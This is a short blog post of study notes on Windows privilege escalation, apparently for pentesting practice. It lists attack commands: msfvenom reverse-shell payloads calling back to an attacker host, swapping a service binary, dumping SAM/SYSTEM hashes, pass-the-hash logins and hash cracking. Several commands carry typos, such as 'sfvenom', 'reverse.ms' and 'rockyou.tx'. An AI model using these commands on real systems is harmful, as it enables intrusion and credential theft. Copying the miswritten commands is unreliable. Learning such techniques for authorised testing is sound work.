---
layout: post
title: 'Notes | Windows Privilage Escalation'
permalink: /notes/system/windows-privilage-escalation/
---

# Insecure Windows Service Permissions
If we manage to find one Insecure Windows Service we can modify the executable file with one corrupted and wait to the service to execute (or by ourselves with *net start [service]*).
We can create a reverse shell with **msfvenom**:
{% highlight bash %}
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerIP] LPORT=[port] -f exe -o reverse.exe
{% endhighlight %}
And change the **reverse.exe** name with the service.exe name.

# Saved Credentials
We can execute:
{% highlight bash %}
> cmdkey /list
{% endhighlight %}
to get some credentials.

# SAM and SYSTEM
We can search for those files in ** C:\Windows\Repair**. With those we can get and crack the system's passwords.
For example with **creddump7**:
{% highlight bash %}
> python3 creddump7/pwdump.py SYSTEM SAM
{% endhighlight %}

Then we can log in with the hash or break the hash:
{% highlight bash %}
> pth-winexe -U 'admin%hash' //[ip] cmd.exe
{% endhighlight %}
{% highlight bash %}
> hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.tx
{% endhighlight %}

# AlwaysInstalledElevated
If that property is set 1 (we can check it with: **reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevate**) we can create a msi with **msfvenom**:
{% highlight bash %}
> sfvenom -p windows/x64/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f msi -o reverse.ms
{% endhighlight %}

# Tools
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)